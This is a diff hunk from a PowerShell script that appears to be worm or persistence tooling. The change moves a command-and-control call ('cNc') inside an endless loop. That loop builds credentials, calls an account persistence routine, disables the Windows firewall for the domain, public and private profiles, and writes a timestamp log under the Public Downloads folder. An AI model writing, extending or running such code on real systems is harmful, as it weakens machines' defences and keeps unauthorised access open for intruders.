@@ -79,11 +79,11 @@ function keepWINRMAlive{
     }
 }
 function wormy{
-    cNc
+    
     while(1 -eq 1){
         [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
         [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
-
+        cNc
         accountPersist
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
         [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
